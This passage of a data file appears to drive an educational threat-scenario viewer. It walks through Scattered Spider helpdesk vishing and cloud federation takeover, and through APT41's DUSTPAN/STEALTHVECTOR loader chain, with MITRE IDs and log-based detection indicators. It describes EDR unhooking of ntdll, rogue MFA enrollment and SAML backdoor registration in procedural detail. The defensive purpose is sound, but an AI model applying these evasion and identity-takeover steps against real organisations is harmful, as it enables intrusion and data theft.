        'Synthesizing joint reports from CISA/FBI Advisory AA23-320A, Palo Alto Networks Unit 42 ("Muddled Libra"), and Google Mandiant ("UNC3944"), this scenario shows how modern identity-focused attackers bypass perimeter firewalls altogether. Instead of exploiting a software bug, the attacker calls the company’s IT Helpdesk pretending to be a real employee (vishing), convinces the helpdesk agent to reset Multi-Factor Authentication (MFA) and enroll the attacker’s own phone (giving the attacker a clean, first-party MFA device on the victim’s account), logs into the corporate Single Sign-On (Okta / Entra ID) portal, searches internal SharePoint/Confluence wikis for admin runbooks, deploys a legitimate remote-access tool (AnyDesk / Tailscale — signed commercial RMM tools that do not trigger malware alerts) for persistence, and pivots into AWS/Azure cloud infrastructure and VMware ESXi hypervisors.',
      diagramTopologySummary:
        'On the diagram: Start at Node ① (Scattered Spider Operator), target Node ②/③ (IT Helpdesk & Corporate IdP / SSO Portal) to enroll a rogue MFA device, pivot into Node ④ (VDI / Intune Workstation & RMM Tunnel), and escalate privileges inside Node ⑤ (AWS / Azure Cloud & ESXi Control Plane), monitored by Node ⑥ (Cloud SIEM / Identity Logs).',
      documentedAdvisory: 'CISA Alert AA23-320A · Unit 42 Muddled Libra Profile · Mandiant UNC3944 Research · MITRE T1556 / T1078.004',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1556',
        plainTitle: 'Helpdesk Social Engineering ("Vishing") to Register a Rogue MFA Device',
        storyAnalogy:
          'Armed with the employee’s badge number and birthday, the caller rings the IT Helpdesk ("Hi, I got a new iPhone and lost my authenticator app") and persuades the helpdesk clerk to pair the caller’s own phone to the employee’s corporate account.',
        simpleExplanation:
          'Having gathered a target IT or DevOps engineer’s personal details (employee ID, date of birth, and manager name from LinkedIn or data brokers), the attacker calls the corporate IT Helpdesk impersonating that employee ("vishing" — voice phishing) and claims they just got a new phone and lost their authenticator app. Persuaded by the caller, the helpdesk clerk triggers an administrative MFA reset (user.mfa.factor.activate — registering the attacker’s own smartphone or FIDO2 security key directly onto the employee’s Okta / Entra ID account so the attacker can approve their own MFA prompts at will).',
        howItWorksInPractice:
          'Unlike phishing attacks that try to steal a temporary session cookie, social-engineering the IT Helpdesk to enroll a new MFA factor on the Identity Provider (IdP) gives the attacker a permanent, legitimate MFA credential tied to their own device.',
        diagramAlignment:
          'On the diagram, follow arrow #1.1→ from Node ① (Scattered Spider Operator) to Node ②/③ (IT Helpdesk & SSO Identity Provider), and return arrow ⇠#1.2 issuing the new MFA enrollment and SAML/OIDC session token.',
        detectionAndEvidence:
          'Documented in CISA AA23-320A & Okta System Log: `user.mfa.factor.deactivate` / `user.mfa.factor.activate` followed immediately by login (`user.session.start`) from a residential VPN/proxy ASN.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1219',
        plainTitle: 'Logging Into the SSO Dashboard, Harvesting Runbooks & Deploying Commercial RMM Tools',
        storyAnalogy:
          'Inside the employee’s virtual office, the intruder reads the IT team’s emergency instruction manuals (`Confluence` / `SharePoint`) and installs a genuine, IT-approved remote support tool (`AnyDesk` / `Tailscale`) so even if the front-door password is changed tomorrow, they still have a private side door straight into the machine.',
        simpleExplanation:
          'Using the newly hijacked Single Sign-On (SSO) account, the attacker logs into the company’s virtual desktop (Citrix / Azure VDI), searches internal IT documentation (Confluence / SharePoint — documented by Mandiant UNC3944 as the primary way the group locates VPN guides, CyberArk/PAM instructions, and VMware vCenter architecture diagrams), and installs commercial Remote Monitoring and Management (RMM) or mesh-VPN tools like AnyDesk, ScreenConnect, Tailscale, or ngrok (chosen because these tools are digitally signed by legitimate software vendors so antivirus does not block them, and they maintain an encrypted outbound tunnel that survives even if the victim’s SSO password and MFA are later reset).',
        howItWorksInPractice:
          'Commercial RMM agents establish persistent outbound TLS/WebSocket connections to the vendor’s relay cloud, giving the attacker full interactive desktop control without deploying any custom malware binary.',
        diagramAlignment:
          'On the diagram, arrow #2.1→ authenticates from Node ③ (SSO Portal) into Node ④ (Corporate VDI / Endpoint) and establishes the RMM tunnel (`⇠#2.2`).',
        detectionAndEvidence:
          'Documented in CISA AA23-320A & Mandiant UNC3944: Sysmon EventID 1 / 22 showing installation of unauthorized RMM binaries (`AnyDesk.exe`, `ScreenConnect`, `tailscaled`) and DNS queries to `*.ngrok.io` or `*.tailscale.com`.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1078.004',
        plainTitle: 'Federation / Cloud Control-Plane Takeover (`AssumeRole`) & VMware `ESX Admins` Pivot',
        storyAnalogy:
          'From the IT dashboard, the intruder attaches a second "Ghost Identity Provider" to the company’s cloud account—allowing them to mint temporary cloud master keys (`AssumeRole`) on demand, take over VMware ESXi hypervisors, and export customer databases from S3.',
        simpleExplanation:
          'Combining Unit 42’s and Mandiant’s findings: pivoting through the SSO dashboard into the AWS / Azure cloud management console, the attacker invokes sts:AssumeRole (minting temporary high-privilege cloud credentials) and calls CreateSAMLProvider / UpdateAssumeRolePolicy (registering a second, attacker-controlled SAML Identity Provider inside the cloud tenant — acting as a "golden SAML" backdoor that lets the attacker mint Admin cloud sessions even after the corporate Okta/Entra tenant is locked down). Simultaneously, for on-premises infrastructure, they add their compromised account to the Active Directory ESX Admins group to take direct SSH control over VMware ESXi hypervisors and export production S3 buckets.',
        howItWorksInPractice:
          'By compromising the Single Sign-On and Active Directory identity layer that governs both cloud role federation and hypervisor authentication, the attacker moves straight from a phone call to the IT Helpdesk into full control of AWS/Azure and VMware ESXi without touching a single network firewall exploit.',
        diagramAlignment:
          'On the diagram, arrow #3.1→ pivots from Node ④ into Node ⑤ (AWS / Azure Cloud Control Plane via `sts:AssumeRole`), while Node ⑥ (CloudTrail / SIEM) alerts on IAM federation changes.',
        detectionAndEvidence:
          'Documented in Unit 42 & AWS CloudTrail / Entra Audit Logs: `CreateSAMLProvider`, `UpdateAssumeRolePolicy`, anomalous `AssumeRole` calls, and AD group modifications to `ESX Admins`.',
      },
    ],
  },

  'elastic-apt41-dustpan-stealthvector': {
    scenarioId: 'elastic-apt41-dustpan-stealthvector',
    briefing: {
      headline: 'Scenario Briefing: APT41 (Earth Freybug) — DUSTPAN Dropper & STEALTHVECTOR / DUSTTRAP Multi-Stage Chain',
      storyAnalogy:
        'Imagine a Russian nesting doll of disguises: first, a trusted Windows system utility (`wermgr.exe`) is woken up; inside it sits a hollow launcher (**DUSTPAN**), which unpacks an encrypted memory-only command center (**STEALTHVECTOR**), which in turn unlocks a modular toolkit (**DUSTTRAP**) that talks directly to the Windows kernel (`ntdll.dll`) so user-mode security cameras never see it.',
      plainSummary:
        'Synthesizing independent research from Google Mandiant (DUSTPAN & DUSTTRAP), Elastic Security Labs (DodgeBox & STEALTHVECTOR), and Trend Micro (Earth Freybug), this scenario examines the multi-stage memory-only loader chain used by APT41. Rather than putting their full backdoor in a single file that analysts could easily reverse-engineer, APT41 uses a chain of hollow loaders: a legitimate Windows process (wermgr.exe — Windows Error Reporting, documented by Trend Micro as chosen because it regularly makes outbound HTTPS connections) is spawned and injected with Mandiant’s DUSTPAN launcher, which decrypts Elastic’s STEALTHVECTOR orchestrator in memory (which overwrites ntdll.dll in RAM to wipe out user-mode EDR hooks and spoofs thread call stacks), which in turn loads the 16-plugin DUSTTRAP framework.',
      diagramTopologySummary:
        'On the diagram: Start at Node ①/② (Scheduled Task / Service Trigger), follow the hollowing of `wermgr.exe` on Node ③ (Enterprise Server), trace the in-memory decryption of DUSTPAN → STEALTHVECTOR → DUSTTRAP inside Node ④ (Multi-Stage Memory Pipeline), and follow the encrypted C2 channel to Node ⑤ monitored by Node ⑥ (SIEM / Elastic EDR).',
      documentedAdvisory: 'Mandiant DUSTPAN/DUSTTRAP · Elastic Security Labs DodgeBox/STEALTHVECTOR · Trend Micro Earth Freybug · MITRE T1620',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1055',
        plainTitle: 'DUSTPAN Launcher Injects Into Windows Error Reporting (`wermgr.exe`)',
        storyAnalogy:
          'The outer nesting doll opens: the dropper starts the official Windows Error Reporting manager (`wermgr.exe`) and slips the **DUSTPAN** stage-1 loader into its memory.',
        simpleExplanation:
          'The initial persistence trigger executes the DUSTPAN stage-1 loader (a lightweight launcher documented by Mandiant that contains zero C2 domains or post-exploitation tools of its own, so if an analyst captures the file on disk they learn nothing about the final implant). DUSTPAN immediately spawns C:\\Windows\\System32\\wermgr.exe (Windows Error Reporting Manager — documented by Trend Micro’s Earth Freybug research as chosen because wermgr.exe is a Microsoft-signed binary that legitimately connects to external HTTPS servers to upload crash reports, allowing C2 traffic to blend in) and injects its decryption stub into wermgr.exe’s memory.',
        howItWorksInPractice:
          'By immediately transferring execution into C:\\Windows\\System32\\wermgr.exe via remote memory allocation and APC/thread hijacking, all subsequent stages execute under the process identity and digital signature of a built-in Windows telemetry binary.',
        diagramAlignment:
          'On the diagram, follow arrow #1.1→ from Node ③ (DUSTPAN Dropper) injecting into Node ④ (`wermgr.exe` Process Memory), and return arrow ⇠#1.2 confirming the in-memory stub is active.',
        detectionAndEvidence:
          'Documented in Sysmon EventID 8 / 10 & Trend Micro Earth Freybug report: remote thread or APC injection targeting `C:\\Windows\\System32\\wermgr.exe` from a non-system parent process.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1140',
        plainTitle: 'STEALTHVECTOR Unhooking `ntdll.dll`, Call-Stack Spoofing & Decrypting DUSTTRAP',
        storyAnalogy:
          'Before opening the inner nesting doll (**DUSTTRAP**), the **STEALTHVECTOR** stage brings in a fresh, un-bugged copy of the Windows system phonebook (`ntdll.dll`) from disk—wiping out all the wiretaps that the endpoint’s EDR security agent had placed on the phone lines.',
        simpleExplanation:
          'Running inside wermgr.exe, the STEALTHVECTOR stage (analyzed by Elastic Security Labs) reads a clean copy of C:\\Windows\\System32\\ntdll.dll from disk and overwrites the .text code section of the already-loaded ntdll.dll in RAM (why attackers do this: user-mode EDR agents monitor a program by placing 5-byte JMP "wiretap" hooks at the start of system functions inside ntdll.dll in memory — so pasting the clean bytes from disk right over the hooked bytes erases all of the EDR’s user-mode wiretaps). Simultaneously, it constructs synthetic thread call-stack frames (RtlUserThreadStart → BaseThreadInitThunk — so EDR memory walkers see a normal Windows call stack instead of unbacked shellcode) and ChaCha20/AES-GCM-decrypts Mandiant’s DUSTTRAP backdoor directly in memory.',
        howItWorksInPractice:
          'To unhook ntdll.dll, STEALTHVECTOR calls VirtualProtect on the in-memory ntdll.dll .text section (temporarily changing it from Read-Execute 0x20 to Read-Write-Execute 0x40), copies the clean .text bytes from the on-disk ntdll.dll file, and restores 0x20 permissions—silencing user-mode API hooks before DUSTTRAP initializes.',
        diagramAlignment:
          'On the diagram, arrow #2.1→ inside Node ④ unhooks `ntdll.dll` and decrypts DUSTTRAP in RAM, and ⇠#2.2 initializes the 16-plugin dispatch table.',
        detectionAndEvidence:
          'Documented by Elastic Security Labs & Mandiant: `VirtualProtect` on `ntdll.dll` `.text` section (RX → RWX → RX) inside `wermgr.exe` followed by unbacked PE execution.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1071.001',
        plainTitle: 'Loading DUSTTRAP’s 16 Plugins in Memory & Beaconing Over Custom mTLS',
        storyAnalogy:
          'With the phone lines un-tapped, the innermost doll (**DUSTTRAP**) snaps modular tool attachments (keylogger, credential harvester, file manager) directly into RAM as the remote operator requests them.',
        simpleExplanation:
          'With ntdll.dll unhooked inside wermgr.exe, the DUSTTRAP core opens a mutual-TLS channel (requiring both client and server certificates so security researchers cannot probe the C2 server or replay traffic) to APT41’s command infrastructure, and loads 16 specialized in-memory plugins (file manager, shell executor, credential harvester, Active Directory recon — streamed into RAM only when needed so the full toolkit never sits on the victim’s hard drive).',
        howItWorksInPractice:
          'Although unhooking ntdll.dll blinds user-mode API hooks inside wermgr.exe, Kernel-mode Event Tracing for Windows (EtwTiLogProtectVM) and Sysmon EventID 3 still catch the ntdll.dll permission change paired with wermgr.exe connecting to a non-Microsoft IP address.',
        diagramAlignment:
          'On the diagram, arrow #3.1→ connects Node ④ (`wermgr.exe` running DUSTTRAP) to Node ⑤ (APT41 C2 Server) while Node ⑥ (SIEM / Kernel ETW) detects the `ntdll` remapping and network beacon.',
        detectionAndEvidence:
          'Documented in Kernel ETW (`EtwTiLogProtectVM`) & Sysmon EventID 3: `ntdll.dll` code page modification paired with persistent outbound TLS from `wermgr.exe` to non-Microsoft IPs.',
      },
    ],
  },
};
